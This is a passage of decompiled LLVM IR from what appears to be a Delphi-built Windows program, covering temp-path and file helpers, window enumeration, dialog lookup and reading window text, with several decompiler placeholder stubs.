  %25 = load i32, i32* @global_var_4096dc, align 4, !insn.addr !1613
  %26 = or i32 %17, 4, !insn.addr !1614
  %27 = add i32 %25, %26, !insn.addr !1614
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1614
  %29 = load i32, i32* %28, align 4, !insn.addr !1614
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1614
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1614
  store i32 %29, i32* %31, align 4, !insn.addr !1614
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1615
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1615
  store i32 ptrtoint ([3 x i8]* @global_var_406bdc to i32), i32* %33, align 4, !insn.addr !1615
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1616
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1617
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1618
  %37 = icmp eq i32 %36, 0, !insn.addr !1618
  %38 = icmp eq i1 %37, false, !insn.addr !1619
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1619
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1619
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1619
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1619
  br i1 %38, label %dec_label_pc_406b25, label %dec_label_pc_406b54, !insn.addr !1619

dec_label_pc_406b54:                              ; preds = %dec_label_pc_406b25, %dec_label_pc_406b0a
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1600
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1620
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1621
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1621
  store i32 0, i32* %42, align 4, !insn.addr !1621
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1622
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1622
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1622
  store i32 %45, i32* %44, align 4, !insn.addr !1622
  %46 = call i32 @function_4034c8(), !insn.addr !1623
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1624
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1624
  store i32 %46, i32* %48, align 4, !insn.addr !1624
  %49 = call i32 @function_403720(), !insn.addr !1625
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1626
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1626
  store i32 %49, i32* %51, align 4, !insn.addr !1626
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1627
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1627
  store i32 %39, i32* %53, align 4, !insn.addr !1627
  %54 = call i32 @function_40446c(), !insn.addr !1628
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1629
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1629
  store i32 %39, i32* %56, align 4, !insn.addr !1629
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1630
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1631
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1631
  store i32 %39, i32* %59, align 4, !insn.addr !1631
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1632
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1633
  br label %dec_label_pc_406b89, !insn.addr !1633

dec_label_pc_406b89:                              ; preds = %dec_label_pc_406b54, %dec_label_pc_406ace, %dec_label_pc_406aa0
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1634
  %62 = load i32, i32* %61, align 4, !insn.addr !1634
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1635
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1636
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1636
  store i32 4221867, i32* %64, align 4, !insn.addr !1636
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1637
  ret i32 %65, !insn.addr !1638
}

define i32 @function_406ba4() local_unnamed_addr {
dec_label_pc_406ba4:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1639
  ret i32 %0, !insn.addr !1639
}

define i32 @function_406ba9() local_unnamed_addr {
dec_label_pc_406ba9:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1640
}

define i32 @function_406bab(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406bab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1641
}

define i32 @function_406be0() local_unnamed_addr {
dec_label_pc_406be0:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1642
  %1 = call i32 @function_4036b8(), !insn.addr !1643
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1644
  store i32 %2, i32* %stack_var_-40, align 4, !insn.addr !1644
  %3 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1644
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1645
  %4 = call i32 @function_403c90(), !insn.addr !1646
  %5 = icmp slt i32 %4, 0, !insn.addr !1647
  br i1 %5, label %dec_label_pc_406c68, label %dec_label_pc_406c36, !insn.addr !1648

dec_label_pc_406c36:                              ; preds = %dec_label_pc_406be0
  %6 = call i32 @"@LStrCmp"(), !insn.addr !1649
  %7 = call i32 @"@LStrCmp"(), !insn.addr !1650
  br label %dec_label_pc_406cb4

dec_label_pc_406c68:                              ; preds = %dec_label_pc_406be0
  %8 = call i32 @function_403c88(), !insn.addr !1651
  %9 = call i32 @"@DynArraySetLength"(), !insn.addr !1652
  %10 = call i32 @function_403c90(), !insn.addr !1653
  %11 = call i32 @"@LStrAsg"(), !insn.addr !1654
  %12 = call i32 @function_403c90(), !insn.addr !1655
  %13 = call i32 @"@LStrAsg"(), !insn.addr !1656
  %14 = call i32 @function_406aa0(), !insn.addr !1657
  br label %dec_label_pc_406cb4, !insn.addr !1657

dec_label_pc_406cb4:                              ; preds = %dec_label_pc_406c36, %dec_label_pc_406c68
  %15 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1658
  call void @__writefsdword(i32 0, i32 %15), !insn.addr !1659
  %16 = call i32 @"@LStrArrayClr"(), !insn.addr !1660
  ret i32 %16, !insn.addr !1661
}

define i32 @function_406ccf() local_unnamed_addr {
dec_label_pc_406ccf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1662
  ret i32 %0, !insn.addr !1662
}

define i32 @function_406cd4() local_unnamed_addr {
dec_label_pc_406cd4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1663
}

define i32 @function_406cd6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406cd6:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -12, !insn.addr !1664
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1664
  %3 = load i32, i32* %2, align 4, !insn.addr !1664
  ret i32 %3, !insn.addr !1665
}

define i32 @function_406ce0() local_unnamed_addr {
dec_label_pc_406ce0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1666
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1666
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1666
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1667
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1668
  %3 = add i32 %2, 1, !insn.addr !1668
  %4 = icmp eq i32 %3, 0, !insn.addr !1668
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1668
  %5 = icmp eq i1 %4, false, !insn.addr !1669
  br i1 %5, label %dec_label_pc_406d18, label %dec_label_pc_406cf9, !insn.addr !1669

dec_label_pc_406cf9:                              ; preds = %dec_label_pc_406ce0
  %6 = load i32, i32* @global_var_40812c, align 4, !insn.addr !1670
  %7 = icmp eq i32 %6, 0, !insn.addr !1670
  br i1 %7, label %dec_label_pc_406d08, label %dec_label_pc_406d03, !insn.addr !1671

dec_label_pc_406d03:                              ; preds = %dec_label_pc_406cf9
  %8 = call i32 @function_406aa0(), !insn.addr !1672
  br label %dec_label_pc_406d08, !insn.addr !1672

dec_label_pc_406d08:                              ; preds = %dec_label_pc_406d03, %dec_label_pc_406cf9
  %9 = call i32 @"@DynArrayClear"(), !insn.addr !1673
  br label %dec_label_pc_406d18, !insn.addr !1673

dec_label_pc_406d18:                              ; preds = %dec_label_pc_406d08, %dec_label_pc_406ce0
  %10 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1674
  call void @__writefsdword(i32 0, i32 %10), !insn.addr !1675
  ret i32 0, !insn.addr !1676
}

define i32 @function_406d26() local_unnamed_addr {
dec_label_pc_406d26:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1677
  ret i32 %0, !insn.addr !1677
}

define i32 @function_406d2b() local_unnamed_addr {
dec_label_pc_406d2b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1678
}

define i32 @function_406d2d(i32 %arg1) local_unnamed_addr {
dec_label_pc_406d2d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1679
}

define i32 @function_406d30() local_unnamed_addr {
dec_label_pc_406d30:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1680
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1680
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1680
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1681
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1682
  %3 = add i32 %2, -1, !insn.addr !1682
  %4 = icmp eq i32 %2, 0, !insn.addr !1682
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1682
  %5 = icmp eq i1 %4, false, !insn.addr !1683
  br i1 %5, label %dec_label_pc_406d64, label %dec_label_pc_406d4a, !insn.addr !1683

dec_label_pc_406d4a:                              ; preds = %dec_label_pc_406d30
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1684
  br label %dec_label_pc_406d64, !insn.addr !1685

dec_label_pc_406d64:                              ; preds = %dec_label_pc_406d4a, %dec_label_pc_406d30
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1686
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1687
  ret i32 0, !insn.addr !1688
}

define i32 @function_406d72() local_unnamed_addr {
dec_label_pc_406d72:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1689
  ret i32 %0, !insn.addr !1689
}

define i32 @function_406d77() local_unnamed_addr {
dec_label_pc_406d77:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1690
}

define i32 @function_406d79(i32 %arg1) local_unnamed_addr {
dec_label_pc_406d79:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1691
}

define i1 @function_406d7c(i8* %pszPath) local_unnamed_addr {
dec_label_pc_406d7c:
  %0 = call i1 @PathFileExistsA(i8* %pszPath), !insn.addr !1692
  ret i1 %0, !insn.addr !1692
}

define i32 @function_406d84() local_unnamed_addr {
dec_label_pc_406d84:
  %eax.0.reg2mem = alloca i32, !insn.addr !1693
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-276 = alloca i32, align 4
  store i32 260, i32* %stack_var_-276, align 4, !insn.addr !1694
  %1 = call i32 @GetTempPathA(i32 %0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1695
  %2 = icmp eq i32 %1, 0, !insn.addr !1696
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1697
  br i1 %2, label %dec_label_pc_406dba, label %dec_label_pc_406d9c, !insn.addr !1697

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d84
  %3 = ptrtoint i32* %stack_var_-276 to i32, !insn.addr !1694
  %4 = add i32 %1, %3
  %5 = add i32 %4, -1, !insn.addr !1698
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1698
  %7 = load i8, i8* %6, align 1, !insn.addr !1698
  %8 = icmp eq i8 %7, 92, !insn.addr !1698
  br i1 %8, label %dec_label_pc_406dac, label %dec_label_pc_406da3, !insn.addr !1699

dec_label_pc_406da3:                              ; preds = %dec_label_pc_406d9c
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1700
  store i8 92, i8* %9, align 1, !insn.addr !1700
  %10 = or i32 %3, 1, !insn.addr !1701
  %11 = add i32 %1, %10, !insn.addr !1701
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1701
  store i8 0, i8* %12, align 1, !insn.addr !1701
  br label %dec_label_pc_406dac, !insn.addr !1701

dec_label_pc_406dac:                              ; preds = %dec_label_pc_406da3, %dec_label_pc_406d9c
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1702
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1702
  br label %dec_label_pc_406dba, !insn.addr !1702

dec_label_pc_406dba:                              ; preds = %dec_label_pc_406dac, %dec_label_pc_406d84
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1703
}

define i32 @function_406dc4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406dc4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1704
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1705
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1706
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1706
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1706
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1707
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1708
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1708
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1709
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1709
  %5 = icmp eq i1 %4, false, !insn.addr !1710
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1711
  br i1 %5, label %dec_label_pc_406e7b, label %dec_label_pc_406dfb, !insn.addr !1711

dec_label_pc_406dfb:                              ; preds = %dec_label_pc_406dc4
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1712
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1712
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1713
  %8 = icmp eq i32 %7, 32770, !insn.addr !1714
  %9 = icmp eq i1 %8, false, !insn.addr !1715
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1715
  br i1 %9, label %dec_label_pc_406e7b, label %dec_label_pc_406e0a, !insn.addr !1715

dec_label_pc_406e0a:                              ; preds = %dec_label_pc_406dfb
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1716
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1716
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1717
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1717
  %13 = add i32 %arg1, 4, !insn.addr !1718
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1718
  %15 = load i32, i32* %14, align 4, !insn.addr !1718
  %16 = icmp eq i32 %15, %12, !insn.addr !1718
  %17 = icmp eq i1 %16, false, !insn.addr !1719
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1719
  br i1 %17, label %dec_label_pc_406e7b, label %dec_label_pc_406e15, !insn.addr !1719

dec_label_pc_406e15:                              ; preds = %dec_label_pc_406e0a
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1720
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1720
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1721
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1722
  %21 = load i32, i32* %20, align 4, !insn.addr !1722
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1723
  %23 = icmp eq i32 %21, %22, !insn.addr !1723
  %24 = icmp eq i1 %23, false, !insn.addr !1724
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1724
  br i1 %24, label %dec_label_pc_406e7b, label %dec_label_pc_406e26, !insn.addr !1724

dec_label_pc_406e26:                              ; preds = %dec_label_pc_406e15
  %25 = add i32 %arg1, 8, !insn.addr !1725
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1725
  %27 = load i32, i32* %26, align 4, !insn.addr !1725
  %28 = icmp eq i32 %27, 0, !insn.addr !1725
  br i1 %28, label %dec_label_pc_406e50, label %dec_label_pc_406e2c, !insn.addr !1726

dec_label_pc_406e2c:                              ; preds = %dec_label_pc_406e26
  %29 = call i32 @function_406f9c(), !insn.addr !1727
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1728
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1729
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_406e7b

dec_label_pc_406e50:                              ; preds = %dec_label_pc_406e26
  %32 = add i32 %arg1, 12, !insn.addr !1730
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1730
  %34 = load i32, i32* %33, align 4, !insn.addr !1730
  %35 = add i32 %arg1, 16, !insn.addr !1731
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1731
  %37 = load i32, i32* %36, align 4, !insn.addr !1731
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1732
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1732
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1732
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1732
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1732
  %43 = add i32 %arg1, 24, !insn.addr !1733
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1733
  store i32 %42, i32* %44, align 4, !insn.addr !1733
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1734
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1734
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1735
  %47 = icmp eq i1 %46, false, !insn.addr !1736
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1737
  br i1 %47, label %dec_label_pc_406e7b, label %dec_label_pc_406e76, !insn.addr !1737

dec_label_pc_406e76:                              ; preds = %dec_label_pc_406e50
  %48 = add i32 %arg1, 20, !insn.addr !1738
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1738
  store i32 %arg2, i32* %49, align 4, !insn.addr !1738
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1739
  br label %dec_label_pc_406e7b, !insn.addr !1739

dec_label_pc_406e7b:                              ; preds = %dec_label_pc_406e2c, %dec_label_pc_406e76, %dec_label_pc_406e50, %dec_label_pc_406e15, %dec_label_pc_406e0a, %dec_label_pc_406dfb, %dec_label_pc_406dc4
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1740
  %51 = load i32, i32* %50, align 4, !insn.addr !1740
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1741
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1742
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1742
  store i32 4222621, i32* %53, align 4, !insn.addr !1742
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1743
  ret i32 %54, !insn.addr !1744
}

define i32 @function_406e96() local_unnamed_addr {
dec_label_pc_406e96:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1745
  ret i32 %0, !insn.addr !1745
}

define i32 @function_406e9b() local_unnamed_addr {
dec_label_pc_406e9b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1746
}

define i32 @function_406e9d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406e9d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1747
}

define i32 @function_406ea8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406ea8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1748
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1749
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1750
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1750
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1750
  %6 = call i32 @function_40441c(), !insn.addr !1751
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1752
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1753
  br label %dec_label_pc_406eec, !insn.addr !1753

dec_label_pc_406eec:                              ; preds = %dec_label_pc_406f0b, %dec_label_pc_406ea8
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1752
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1752
  store i32 %7, i32* %9, align 4, !insn.addr !1752
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1754
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1754
  store i32 4222404, i32* %11, align 4, !insn.addr !1754
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1755
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1756
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1756
  store i32 1, i32* %14, align 4, !insn.addr !1756
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1757
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1758
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1758
  store i32 0, i32* %16, align 4, !insn.addr !1758
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1759
  %18 = icmp eq i1 %17, false, !insn.addr !1760
  %19 = icmp eq i1 %18, false, !insn.addr !1761
  br i1 %19, label %dec_label_pc_406f16, label %dec_label_pc_406f0b, !insn.addr !1761

dec_label_pc_406f0b:                              ; preds = %dec_label_pc_406eec
  %20 = call i32 @function_40441c(), !insn.addr !1762
  %21 = sub i32 %20, %6, !insn.addr !1763
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1764
  %23 = icmp eq i1 %22, false, !insn.addr !1765
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1765
  br i1 %23, label %dec_label_pc_406eec, label %dec_label_pc_406f16, !insn.addr !1765

dec_label_pc_406f16:                              ; preds = %dec_label_pc_406f0b, %dec_label_pc_406eec
  ret i32 0, !insn.addr !1766
}

define i32 @function_406f30() local_unnamed_addr {
dec_label_pc_406f30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1767
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1768
}

define i32 @function_406f48(i32 %arg1) local_unnamed_addr {
dec_label_pc_406f48:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1769
  %edi.0.reg2mem = alloca i32, !insn.addr !1769
  %ecx.0.reg2mem = alloca i32, !insn.addr !1769
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1770
  br label %2, !insn.addr !1770

; <label>:2:                                      ; preds = %4, %dec_label_pc_406f48
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1770
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1770
  br i1 %3, label %10, label %4, !insn.addr !1770

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1770
  %6 = load i8, i8* %5, align 1, !insn.addr !1770
  %7 = icmp eq i8 %6, 0, !insn.addr !1770
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1770
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1770
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1770
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1770
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1770
  br i1 %7, label %10, label %2, !insn.addr !1770

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1771
  ret i32 %11, !insn.addr !1772
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_406f9c() local_unnamed_addr {
dec_label_pc_406f9c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1773
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1774
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1774
  %4 = add i32 %3, %1, !insn.addr !1775
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1775
  store i8 0, i8* %5, align 1, !insn.addr !1775
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1776
  ret i32 %6, !insn.addr !1777
}

define i32 @function_406fd0() local_unnamed_addr {
dec_label_pc_406fd0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1778
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1779
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1780
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1780
  %6 = add i32 %5, %3, !insn.addr !1781
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1781
  store i8 0, i8* %7, align 1, !insn.addr !1781
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1782
  ret i32 %8, !insn.addr !1783
}

define i32 @function_407008() local_unnamed_addr {
dec_label_pc_407008:
  %0 = call i32 @function_4034c8(), !insn.addr !1784
  %1 = call i32 @function_4034c8(), !insn.addr !1785
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1786
  ret i32 %2, !insn.addr !1787
}

define i32 @function_407048() local_unnamed_addr {
dec_label_pc_407048:
  %0 = call i32 @function_4034c8(), !insn.addr !1788
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1789
  ret i32 %1, !insn.addr !1790
}

define i32 @function_407080() local_unnamed_addr {
dec_label_pc_407080:
  %0 = call i32 @function_4036c8(), !insn.addr !1791
  %1 = call i32 @function_4036c8(), !insn.addr !1792
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1793
  %3 = icmp eq i32 %2, 2, !insn.addr !1794
  %4 = zext i1 %3 to i32, !insn.addr !1795
  %5 = and i32 %2, -256, !insn.addr !1795
  %6 = or i32 %5, %4, !insn.addr !1795
  ret i32 %6, !insn.addr !1796
}

define i32 @function_4070b0() local_unnamed_addr {
dec_label_pc_4070b0:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1797
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1797
  %esp.02.reg2mem = alloca i32, !insn.addr !1797
  %storemerge3.reg2mem = alloca i32, !insn.addr !1797
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1798
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1798
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1798
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1799
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1800
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1801
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1801
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1802
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1802
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1802
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1803
  %9 = icmp eq i1 %8, false, !insn.addr !1804
  %10 = icmp eq i1 %9, false, !insn.addr !1805
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1805
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1805
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1805
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1805
  br i1 %10, label %dec_label_pc_4070d4, label %dec_label_pc_407114, !insn.addr !1805

